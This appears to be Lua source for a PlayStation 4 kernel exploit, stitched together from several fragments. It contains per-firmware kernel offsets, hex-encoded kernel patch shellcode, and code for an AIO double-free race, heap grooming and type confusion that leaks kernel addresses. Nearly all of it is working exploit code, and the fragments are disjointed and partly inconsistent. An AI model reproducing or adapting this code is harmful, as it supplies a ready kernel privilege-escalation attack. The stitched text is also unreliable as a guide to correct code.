    Offsets.addFirmwareOffsets("9.51", 0xFFFFFFFF82437E00, 0xFFFFFFFF8266D0E0, 0xFFFFFFFF8266D1B0, 0x3F8, 0xFFFFFFFF8263A710, 0xFFFFFFFF8245C71E, 0xFFFFFFFF826A1E40)
    Offsets.addFirmwareOffsets("9.60", 0xFFFFFFFF82437E00, 0xFFFFFFFF8266D0E0, 0xFFFFFFFF8266D1B0, 0x3F8, 0xFFFFFFFF8263A710, 0xFFFFFFFF8245C71E, 0xFFFFFFFF826A1E40)
    Offsets.addFirmwareOffsets("10.00", 0xFFFFFFFF8243AE00, 0xFFFFFFFF826700E0, 0xFFFFFFFF826701B0, 0x3F8, 0xFFFFFFFF8263D710, 0xFFFFFFFF8245F71E, 0xFFFFFFFF826A4E40)
    Offsets.addFirmwareOffsets("10.01", 0xFFFFFFFF8243AE00, 0xFFFFFFFF826700E0, 0xFFFFFFFF826701B0, 0x3F8, 0xFFFFFFFF8263D710, 0xFFFFFFFF8245F71E, 0xFFFFFFFF826A4E40)
    Offsets.addFirmwareOffsets("10.50", 0xFFFFFFFF82443E00, 0xFFFFFFFF826790E0, 0xFFFFFFFF826791B0, 0x3F8, 0xFFFFFFFF82646710, 0xFFFFFFFF8246871E, 0xFFFFFFFF826ADE40)
    Offsets.addFirmwareOffsets("10.70", 0xFFFFFFFF82443E00, 0xFFFFFFFF826790E0, 0xFFFFFFFF826791B0, 0x3F8, 0xFFFFFFFF82646710, 0xFFFFFFFF8246871E, 0xFFFFFFFF826ADE40)
    Offsets.addFirmwareOffsets("10.71", 0xFFFFFFFF82443E00, 0xFFFFFFFF826790E0, 0xFFFFFFFF826791B0, 0x3F8, 0xFFFFFFFF82646710, 0xFFFFFFFF8246871E, 0xFFFFFFFF826ADE40)
    Offsets.addFirmwareOffsets("11.00", 0xFFFFFFFF82444E00, 0xFFFFFFFF8267A0E0, 0xFFFFFFFF8267A1B0, 0x3F8, 0xFFFFFFFF82647710, 0xFFFFFFFF8246971E, 0xFFFFFFFF826AE940)
    Offsets.addFirmwareOffsets("11.02", 0xFFFFFFFF82444E00, 0xFFFFFFFF8267A0E0, 0xFFFFFFFF8267A1B0, 0x3F8, 0xFFFFFFFF82647710, 0xFFFFFFFF8246971E, 0xFFFFFFFF826AE940)
    Offsets.addFirmwareOffsets("11.50", 0xFFFFFFFF8244DE00, 0xFFFFFFFF826840E0, 0xFFFFFFFF826841B0, 0x3F8, 0xFFFFFFFF82651710, 0xFFFFFFFF8247371E, 0xFFFFFFFF826B8E40)
    Offsets.addFirmwareOffsets("11.52", 0xFFFFFFFF8244DE00, 0xFFFFFFFF826840E0, 0xFFFFFFFF826841B0, 0x3F8, 0xFFFFFFFF82651710, 0xFFFFFFFF8247371E, 0xFFFFFFFF826B8E40)
    Offsets.addFirmwareOffsets("12.00", 0xFFFFFFFF8244F000, 0xFFFFFFFF826852E0, 0xFFFFFFFF826853B0, 0x3F8, 0xFFFFFFFF82652910, 0xFFFFFFFF8247491E, 0xFFFFFFFF826BA040)
    Offsets.addFirmwareOffsets("12.02", 0xFFFFFFFF8244F000, 0xFFFFFFFF826852E0, 0xFFFFFFFF826853B0, 0x3F8, 0xFFFFFFFF82652910, 0xFFFFFFFF8247491E, 0xFFFFFFFF826BA040)
    Offsets.addFirmwareOffsets("12.50", 0xFFFFFFFF82457000, 0xFFFFFFFF8268D2E0, 0xFFFFFFFF8268D3B0, 0x3F8, 0xFFFFFFFF8265A910, 0xFFFFFFFF8247C91E, 0xFFFFFFFF826C2040)
    Offsets.addFirmwareOffsets("12.52", 0xFFFFFFFF82457000, 0xFFFFFFFF8268D2E0, 0xFFFFFFFF8268D3B0, 0x3F8, 0xFFFFFFFF8265A910, 0xFFFFFFFF8247C91E, 0xFFFFFFFF826C2040)

    shellcodeData["9.00"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"
    shellcodeData["9.03"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"
    shellcodeData["9.04"] = shellcodeData["9.03"]
    shellcodeData["9.50"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"
    shellcodeData["9.51"] = shellcodeData["9.50"]
    shellcodeData["9.60"] = shellcodeData["9.50"]
    shellcodeData["10.00"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"
    shellcodeData["10.01"] = shellcodeData["10.00"]
    shellcodeData["10.50"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"
    shellcodeData["10.70"] = shellcodeData["10.50"]
    shellcodeData["10.71"] = shellcodeData["10.50"]
    shellcodeData["11.50"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"
    shellcodeData["11.52"] = shellcodeData["11.50"]
    shellcodeData["12.00"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"
    shellcodeData["12.02"] = shellcodeData["12.00"]
    shellcodeData["12.50"] = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3"
    shellcodeData["12.52"] = shellcodeData["12.50"]
end

local function addFirmwareOffsets(fw, evf, prison0, rootvnode, targetId, sysent661, jmpRsi, klLock)
    local offsets = {}
    offsets["EVF_OFFSET"] = evf
    offsets["PRISON0"] = prison0
    offsets["ROOTVNODE"] = rootvnode
    offsets["TARGET_ID_OFFSET"] = targetId
    offsets["SYSENT_661_OFFSET"] = sysent661
    offsets["JMP_RSI_GADGET"] = jmpRsi
    offsets["KL_LOCK"] = klLock
    ps4KernelOffsets[fw] = offsets
end

Offsets = {
    addFirmwareOffsets = addFirmwareOffsets
}

function Kernel.getFirmwareVersion()
    if currentFirmware == nil then
        currentFirmware = Helper.getCurrentFirmwareVersion()
    end
    return currentFirmware
end

function Kernel.hasPS4Offsets()
    return ps4KernelOffsets[Kernel.getFirmwareVersion()] ~= nil
end

function Kernel.getPS4Offset(offsetName)
    local fw = Kernel.getFirmwareVersion()
    local offsets = ps4KernelOffsets[fw]
    if offsets == nil then
        error("No offsets available for firmware " .. fw)
    end

    local offset = offsets[offsetName]
    if offset == nil then
        error("Offset " .. offsetName .. " not found for firmware " .. fw)
    end

    return offset
end

function Kernel.shouldApplyKernelPatches()
    return Kernel.hasPS4Offsets() and Kernel.hasShellcodeForCurrentFirmware()
end

function Kernel.getKernelPatchesShellcode()
    local firmware = Kernel.getFirmwareVersion()
    local shellcode = shellcodeData[firmware]
    if shellcode == nil or #shellcode == 0 then
        return {}
    end
    return hexToBinary(shellcode)
end

function Kernel.hasShellcodeForCurrentFirmware()
    local firmware = Kernel.getFirmwareVersion()
    return shellcodeData[firmware] ~= nil
end

local function hexToBinary(hex)
    local result = {}
    for i = 1, #hex / 2 do
        local index = (i - 1) * 2 + 1
        local value = tonumber(string.sub(hex, index, index + 1), 16)
        result[i] = value
    end
    return result
end

function Kernel.initializeFromHelper()
    local helperFirmware = Helper.getCurrentFirmwareVersion()
    if helperFirmware ~= nil then
        currentFirmware = helperFirmware
    end
end

-- Worker thread for AIO deletion race
Lapse.DeleteWorkerThread = {}
Lapse.DeleteWorkerThread.__index = Lapse.DeleteWorkerThread

function Lapse.DeleteWorkerThread.new(requestAddr, errors, pipeFd)
    local self = setmetatable({}, Lapse.DeleteWorkerThread)
    self.requestAddr = requestAddr
    self.errors = errors
    self.pipeFd = pipeFd
    self.ready = false
    self.completed = false
    self.workerError = -1
    return self
end

function Lapse.DeleteWorkerThread:run()
    xpcall(function()
        self.ready = true

        -- Block on pipe read
        local pipeBuf = Helper.createBuffer(8)
        Helper.syscall(Helper.SYS_READ, self.pipeFd, pipeBuf.address, 1)

        -- Execute AIO deletion
        Helper.aioMultiDelete(self.requestAddr, 1, self.errors.address + 4)

        self.workerError = self.errors:getInt(4)
        self.completed = true
    end, function(err)
        self.workerError = -1
        self.completed = true
        print("DeleteWorkerThread error:", err)
    end)
end

function Lapse.DeleteWorkerThread:isReady()
    return self.ready
end

function Lapse.DeleteWorkerThread:isCompleted()
    return self.completed
end

function Lapse.DeleteWorkerThread:getWorkerError()
    return self.workerError
end

-- Initialize all classes in proper order
local function initializeExploit()
    xpcall(function()
        Kernel.initializeKernelOffsets()
    end, function(err)
        error("Initialization failed: " .. err)
    end)
end

Lapse.performSetup = function()
    -- CPU pinning and priority
    previousCore = Helper.getCurrentCore()



```lua
local Helper = {}

function Helper.syscall(number, ...)
    local args = {...}
    return Helper.api.call(syscallWrappers[number + 1], table.unpack(args))
end

local blockId
local groomIds
local sockets

local function createBlockAio()
    local NUM_WORKERS = 3
    local NUM_GROOMS = 20

    groomIds = {}

    local blockReqs = Helper.createAioRequests(NUM_WORKERS)
    if blockReqs == nil then
        return false
    end

    local blockIdBuf = Buffer.new(4)
    local result = Helper.aioSubmitCmd(Helper.AIO_CMD_READ, blockReqs.address(), NUM_WORKERS, 
                                     Helper.AIO_PRIORITY_HIGH, blockIdBuf.address())
    if result ~= 0 then
        return false
    end

    blockId = blockIdBuf:getInt(0)

    local numReqs = 3
    local groomReqs = Helper.createAioRequests(numReqs)

    local validCount = 0

    for i = 0, NUM_GROOMS - 1 do
        local singleId = Buffer.new(4)
        result = Helper.aioSubmitCmd(Helper.AIO_CMD_READ, groomReqs.address(), numReqs, 
                                   Helper.AIO_PRIORITY_HIGH, singleId.address())
        if result == 0 then
            groomIds[i + 1] = singleId:getInt(0)
            validCount = validCount + 1
        else
            groomIds[i + 1] = 0
        end
    end

    cancelGroomAios()

    return true
end

local blockFd
local unblockFd

local function createSocketPair()
    local sockpair = Buffer.new(8)
    local result = Helper.syscall(Helper.SYS_SOCKETPAIR, Helper.AF_UNIX, 
                                   Helper.SOCK_STREAM, 0, sockpair.address())
    if result ~= 0 then
        return false
    end

    blockFd = sockpair:getInt(0)
    unblockFd = sockpair:getInt(4)

    return true
end

local function cancelGroomAios()
    local errors = Buffer.new(4 * Helper.MAX_AIO_IDS)

    for i = 0, NUM_GROOMS - 1, Helper.MAX_AIO_IDS do
        local batchSize = math.min(Helper.MAX_AIO_IDS, NUM_GROOMS - i)
        local batchIds = Buffer.new(4 * batchSize)

        for j = 0, batchSize - 1 do
            batchIds:putInt(j * 4, groomIds[i + j + 1])
        end

        Helper.aioMultiCancel(batchIds.address(), batchSize, errors.address())
    end
end

local function executeStage1()
    local NUM_SDS = 10
    local NUM_RACES = 1000

    sockets = {}
    for i = 0, NUM_SDS - 1 do
        sockets[i + 1] = Helper.createUdpSocket()
    end

    local serverAddr = Buffer.new(16)
    serverAddr:fill(0)
    serverAddr:putByte(1, Helper.AF_INET)
    serverAddr:putShort(2, Helper.htons(5050))
    serverAddr:putInt(4, Helper.aton("127.0.0.1"))

    local listenSd = Helper.createTcpSocket()
    if listenSd < 0 then
        return nil
    end

    local enable = Buffer.new(4)
    enable:putInt(0, 1)
    Helper.setSockOpt(listenSd, Helper.SOL_SOCKET, Helper.SO_REUSEADDR, enable, 4)

    local bindResult = Helper.syscall(Helper.SYS_BIND, listenSd, serverAddr.address(), 16)
    if bindResult ~= 0 then
        Helper.syscall(Helper.SYS_CLOSE, listenSd)
        return nil
    end

    local listenResult = Helper.syscall(Helper.SYS_LISTEN, listenSd, 1)
    if listenResult ~= 0 then
        Helper.syscall(Helper.SYS_CLOSE, listenSd)
        return nil
    end

    local numReqs = 3
    local whichReq = numReqs - 1

    for attempt = 1, NUM_RACES do

        local clientSd = Helper.createTcpSocket()
        if clientSd < 0 then
            goto continue
        end

        local connectResult = Helper.syscall(Helper.SYS_CONNECT, clientSd, 
                                           serverAddr.address(), 16)
        if connectResult ~= 0 then
            Helper.syscall(Helper.SYS_CLOSE, clientSd)
            goto continue
        end

        local connSd = Helper.syscall(Helper.SYS_ACCEPT, listenSd, 0, 0)
        if connSd < 0 then
            Helper.syscall(Helper.SYS_CLOSE, clientSd)
            goto continue
        end

        local lingerBuf = Buffer.new(8)
        lingerBuf:fill(0)
        lingerBuf:putInt(0, 1)  -- l_onoff - linger active
        lingerBuf:putInt(4, 1)  -- l_linger - 1 second

        Helper.setSockOpt(clientSd, Helper.SOL_SOCKET, Helper.SO_LINGER, lingerBuf, 8)

        local reqs = Helper.createAioRequests(numReqs)
        local aioIds = Buffer.new(4 * numReqs)

        reqs:putInt(whichReq * 0x28 + 0x20, clientSd)

        local submitResult = Helper.aioSubmitCmd(Helper.AIO_CMD_MULTI_READ, reqs.address(), 
                                              numReqs, Helper.AIO_PRIORITY_HIGH, aioIds.address())
        if submitResult ~= 0 then
            Helper.syscall(Helper.SYS_CLOSE, clientSd)
            Helper.syscall(Helper.SYS_CLOSE, connSd)
            goto continue
        end

        local errors = Buffer.new(4 * numReqs)
        Helper.aioMultiCancel(aioIds.address(), numReqs, errors.address())
        Helper.aioMultiPoll(aioIds.address(), numReqs, errors.address())

        Helper.syscall(Helper.SYS_CLOSE, clientSd)

        local requestAddr = aioIds.address() + (whichReq * 4)
        local aliasedPair = raceOne(requestAddr, connSd, sockets)

        Helper.aioMultiDelete(aioIds.address(), numReqs, errors.address())
        Helper.syscall(Helper.SYS_CLOSE, connSd)

        if aliasedPair ~= nil then
            Helper.syscall(Helper.SYS_CLOSE, listenSd)
            return aliasedPair
        end

        if attempt % 10 == 0 then
            --Thread.sleep(10);  --Removed sleep
        end

        ::continue::
    end

    Helper.syscall(Helper.SYS_CLOSE, listenSd)
    return nil
end

local function raceOne(requestAddr, tcpSd, testSockets)
    local sceErrs = Buffer.new(8)
    sceErrs:putInt(0, -1)
    sceErrs:putInt(4, -1)

    local pipe = Buffer.new(8)
    local pipeResult = Helper.syscall(Helper.SYS_SOCKETPAIR, Helper.AF_UNIX, 
                                       Helper.SOCK_STREAM, 0, pipe.address())
    if pipeResult ~= 0 then
        return nil
    end

    local pipeReadFd = pipe:getInt(0)
    local pipeWriteFd = pipe:getInt(4)

    local worker = DeleteWorkerThread.new(requestAddr, sceErrs, pipeReadFd)
    worker:start()
```

```lua
local Helper = Helper or {}

local NUM_ALIAS = 8
local NUM_SDS = 8

function Helper.runRace(requestAddr, testSockets, worker, sceErrs, tcpSd)
    local pipe = Helper.syscall(Helper.SYS_PIPE)
    if pipe == nil then
        return nil
    end

    local pipeReadFd = pipe[1]
    local pipeWriteFd = pipe[2]
    
    if pipeReadFd < 0 or pipeWriteFd < 0 then
        return nil
    end

    -- Start worker thread
    worker:start()

    local waitCount = 0
    while not worker:isReady() and waitCount < 1000 do
        coroutine.yield()
        waitCount = waitCount + 1
    end
    
    if not worker:isReady() then
        Helper.syscall(Helper.SYS_CLOSE, pipeReadFd)
        Helper.syscall(Helper.SYS_CLOSE, pipeWriteFd)
        return nil
    end

    -- Signal worker to proceed
    local pipeBuf = Helper.Buffer.new(8)
    Helper.syscall(Helper.SYS_WRITE, pipeWriteFd, pipeBuf:address(), 1)

    -- Yield once to let worker start, then poll immediately
    coroutine.yield()

    -- Poll AIO state while worker should be blocked in soclose()
    local pollErr = Helper.Buffer.new(4)
    Helper.aioMultiPoll(requestAddr, 1, pollErr:address())
    local pollRes = pollErr:getInt(0)

    -- Check TCP state
    local infoBuffer = Helper.Buffer.new(0x100)
    local infoSize = Helper.getSockOpt(tcpSd, Helper.IPPROTO_TCP, Helper.TCP_INFO, infoBuffer, 0x100)
    local tcpState = (infoSize > 0) and (bit.band(infoBuffer:getByte(0), 0xFF)) or -1

    local wonRace = false

    if pollRes ~= Helper.SCE_KERNEL_ERROR_ESRCH and tcpState ~= Helper.TCPS_ESTABLISHED then
        -- Execute main delete
        Helper.aioMultiDelete(requestAddr, 1, sceErrs:address())
        wonRace = true
    end

    -- Wait for worker to complete
    worker:join(2000)

    -- Check race results
    if wonRace and worker:isCompleted() then
        local mainError = sceErrs:getInt(0)
        local workerError = worker:getWorkerError()

        -- Both errors must be equal and 0 for successful double-free
        if mainError == workerError and mainError == 0 then
            local aliasedPair = Helper.makeAliasedRthdrs(testSockets)
            
            if aliasedPair ~= nil then

                Helper.syscall(Helper.SYS_CLOSE, pipeReadFd)
                Helper.syscall(Helper.SYS_CLOSE, pipeWriteFd)

                return aliasedPair
                
            else
            end
        else
        end
    elseif wonRace and not worker:isCompleted() then
    end

    Helper.syscall(Helper.SYS_CLOSE, pipeReadFd)
    Helper.syscall(Helper.SYS_CLOSE, pipeWriteFd)

    return nil

end

function Helper.makeAliasedRthdrs(sds)
    local markerOffset = 4
    local size = 0x80
    local buf = Helper.Buffer.new(size)
    local rsize = Helper.buildRoutingHeader(buf, size)

    for loop = 1, NUM_ALIAS do

        for i = 1, math.min(#sds, NUM_SDS) do
            if sds[i] >= 0 then
                buf:putInt(markerOffset, i)
                Helper.setRthdr(sds[i], buf, rsize)
            end
        end

        for i = 1, math.min(#sds, NUM_SDS) do
            if sds[i] >= 0 then
                Helper.getRthdr(sds[i], buf, size)
                local marker = buf:getInt(markerOffset)
                
                if marker ~= i and marker > 0 and marker <= NUM_SDS then
                    local aliasedIdx = marker - 1
                    if aliasedIdx >= 0 and aliasedIdx < #sds and sds[aliasedIdx + 1] >= 0 then
                        local sdPair = {sds[i], sds[aliasedIdx + 1]}

                        Helper.removeSocketFromArray(sds, math.max(i - 1, aliasedIdx))
                        Helper.removeSocketFromArray(sds, math.min(i - 1, aliasedIdx))
                        Helper.freeRthdrs(sds)
                        
                        Helper.addSocketToArray(sds, Helper.createUdpSocket())
                        Helper.addSocketToArray(sds, Helper.createUdpSocket())

                        return sdPair
                    end
                end
            end
        end
    end

    return nil
    
end

function Helper.makeAliasedPktopts(sds)
    local tclass = Helper.Buffer.new(4)

    local validSockets = 0
    for i = 1, #sds do
        if sds[i] >= 0 then
            validSockets = validSockets + 1
        end
    end
    
    if validSockets < 2 then
        return nil
    end

    for loop = 1, NUM_ALIAS do
        local markersSet = 0
        for i = 1, #sds do
            if sds[i] >= 0 then
                tclass:putInt(0, i)
                Helper.setSockOpt(sds[i], Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4)
                markersSet = markersSet + 1
            end
        end
        
        if markersSet == 0 then
            break
        end

        for i = 1, #sds do
            if sds[i] >= 0 then
                Helper.getSockOpt(sds[i], Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4)
                local marker = tclass:getInt(0)
                
                if marker ~= i and marker > 0 and marker <= #sds then
                    local aliasedIdx = marker - 1
                    if aliasedIdx >= 0 and aliasedIdx < #sds and sds[aliasedIdx + 1] >= 0 then

                        local sdPair = {sds[i], sds[aliasedIdx + 1]}
                        
                        Helper.removeSocketFromArray(sds, math.max(i - 1, aliasedIdx))
                        Helper.removeSocketFromArray(sds, math.min(i - 1, aliasedIdx))
                        
                        for j = 1, 2 do
                            local sockFd = Helper.createUdpSocket()
                            Helper.setSockOpt(sockFd, Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4)
                            Helper.addSocketToArray(sds, sockFd)
                        end
                        return sdPair
                    end
                end
            end
        end

        for i = 1, #sds do
            if sds[i] >= 0 then
                Helper.setSockOpt(sds[i], Helper.IPPROTO_IPV6, Helper.IPV6_2292PKTOPTIONS, Helper.Buffer.new(1), 0)
            end
        end
    end

    return nil
end

function Helper.verifyReqs2(buf, offset, cmd)
    -- reqs2.ar2_cmd
    local actualCmd = buf:getInt(offset)
    if actualCmd ~= cmd then
        return false
    end

    -- heap_prefixes array to track common heap address prefixes
    local heapPrefixes = {}
    local prefixCount = 0

    -- Check if offsets 0x10 to 0x20 look like kernel heap addresses
    for i = 0x10, 0x20, 8 do
        local highWord = buf:getShort(offset + i + 6)
        if highWord ~= -1 then
            return false
        end
        if prefixCount < 8 then
            heapPrefixes[prefixCount + 1] = bit.band(buf:getShort(offset + i + 4), 0xffff)
            prefixCount = prefixCount + 1
        end
    end

    -- Check reqs2.ar2_result.state
    local state1 = buf:getInt(offset + 0x38)
    local state2 = buf:getInt(offset + 0x38 + 4)
```

```lua
local Helper = {}

local evf = nil
local kernelAddr = nil
local kbufAddr = nil
local fakeReqs3Sd = nil
local sockets = {}

local syscallWrappers = {}

local NUM_HANDLES = 6
local NUM_ALIAS = 12
local NUM_LEAKS = 5
local NUM_SDS = 16
local LEAK_LEN = 0x10

local function verifyReqs2(buf, offset, cmd)
    local heapPrefixes = {}
    local prefixCount = 0

    -- Ensure the buffer is large enough to prevent out-of-bounds reads
    if offset + 0x58 > buf.length then
        return false
    end

    -- Check state1 and state2
    local state1 = buf:getInt(offset + 0x54)
    local state2 = buf:getInt(offset + 0x58)

    if not (state1 > 0 and state1 <= 4) or state2 ~= 0 then
        return false
    end

    -- reqs2.ar2_file must be NULL
    local filePtr = buf:getLong(offset + 0x40)
    if filePtr ~= 0 then
        return false
    end

    -- Check if offsets 0x48 to 0x50 look like kernel addresses
    for i = 0x48, 0x50, 8 do
        local highWord = buf:getShort(offset + i + 6)
        if highWord == 0xffff then
            local midWord = buf:getShort(offset + i + 4)
            if midWord ~= 0xffff and prefixCount < #heapPrefixes then
                heapPrefixes[prefixCount + 1] = midWord & 0xffff
                prefixCount = prefixCount + 1
            end
        elseif i == 0x48 or buf:getLong(offset + i) ~= 0 then
            return false
        end
    end

    if prefixCount < 2 then
        return false
    end

    -- Check that heap prefixes are consistent
    local firstPrefix = heapPrefixes[1]
    for i = 2, prefixCount do
        if heapPrefixes[i] ~= firstPrefix then
            return false
        end
    end

    return true
end

-- STAGE 2: Leak kernel addresses
local function executeStage2(aliasedPair)
    local sd = aliasedPair[1]
    local bufLen = 0x80 * LEAK_LEN
    local buf = Helper.Buffer(bufLen)

    -- Type confuse a struct evf with a struct ip6_rthdr
    local name = Helper.Buffer(1)

    -- Free one of rthdr
    Helper.syscall(Helper.SYS_CLOSE, aliasedPair[2])

    evf = -1

    for i = 1, NUM_ALIAS do
        local evfs = {}

        -- Reclaim freed rthdr with evf object
        for j = 1, NUM_HANDLES do
            local evfFlags = 0xf00 | ((j) << 16)
            evfs[j] = Helper.createEvf(name:address(), evfFlags)
        end

        Helper.getRthdr(sd, buf, 0x80)

        local flag = buf:getInt(0)

        if (flag & 0xf00) == 0xf00 then
            local idx = flag >>> 16
            local expectedFlag = flag | 1

            if idx >= 1 and idx <= #evfs then
                evf = evfs[idx]

                Helper.setEvfFlags(evf, expectedFlag)
                Helper.getRthdr(sd, buf, 0x80)

                local val = buf:getInt(0)
                if val == expectedFlag then
                    -- Success - keep this EVF
                else
                    evf = -1  -- Reset on failure
                end
            else
            end
        end

        -- Free all EVFs except the found one
        for j = 1, NUM_HANDLES do
            if evfs[j] ~= evf and evfs[j] >= 0 then
                -- Attempt to free EVFs but continue on failure
                xpcall(function()
                    Helper.freeEvf(evfs[j])
                end, function(err)
                    --print("Error freeing evf: " .. tostring(err))
                end)
            end
        end

        if evf ~= -1 then
            break
        end
    end

    if evf == -1 then
        error("Failed to confuse evf and rthdr")
    end

    -- Enlarge ip6_rthdr by writing to its len field by setting the evf's flag
    Helper.setEvfFlags(evf, 0xff << 8)

    -- evf.cv.cv_description = "evf cv" - string is located at the kernel's mapped ELF file
    kernelAddr = buf:getLong(0x28)

    -- evf.waiters.tqh_last == &evf.waiters.tqh_first
    kbufAddr = buf:getLong(0x40) - 0x38

    -- Prep to fake reqs3 (aio_batch)
    local wbufsz = 0x80
    local wbuf = Helper.Buffer(wbufsz)
    local rsize = Helper.buildRoutingHeader(wbuf, wbufsz)
    local markerVal = 0xdeadbeef
    local reqs3Offset = 0x10

    wbuf:putInt(4, markerVal)
    wbuf:putInt(reqs3Offset + 0, 1)  -- .ar3_num_reqs
    wbuf:putInt(reqs3Offset + 4, 0)  -- .ar3_reqs_left
    wbuf:putInt(reqs3Offset + 8, Helper.AIO_STATE_COMPLETE)  -- .ar3_state
    wbuf:putByte(reqs3Offset + 0xc, 0)  -- .ar3_done
    wbuf:putInt(reqs3Offset + 0x28, 0x67b0000)  -- .ar3_lock.lock_object.lo_flags
    wbuf:putLong(reqs3Offset + 0x38, 1)  -- .ar3_lock.lk_lock = LK_UNLOCKED

    -- Prep to leak reqs2 (aio_entry)
    local numElems = 6
    local ucred = kbufAddr + 4
    local leakReqs = Helper.createAioRequests(numElems)
    leakReqs:putLong(0x10, ucred)  -- .ai_cred

    local numLoop = NUM_SDS
    local leakIdsLen = numLoop * numElems
    local leakIds = Helper.Buffer(4 * leakIdsLen)
    local step = 4 * numElems
    local cmd = Helper.AIO_CMD_FLAG_MULTI | Helper.AIO_CMD_WRITE

    local reqs2Off = -1
    local fakeReqs3Off = -1
    fakeReqs3Sd = -1

    for i = 1, NUM_LEAKS do

        -- Spray reqs2 and rthdr with fake reqs3
        for j = 1, numLoop do
            wbuf:putInt(8, j)
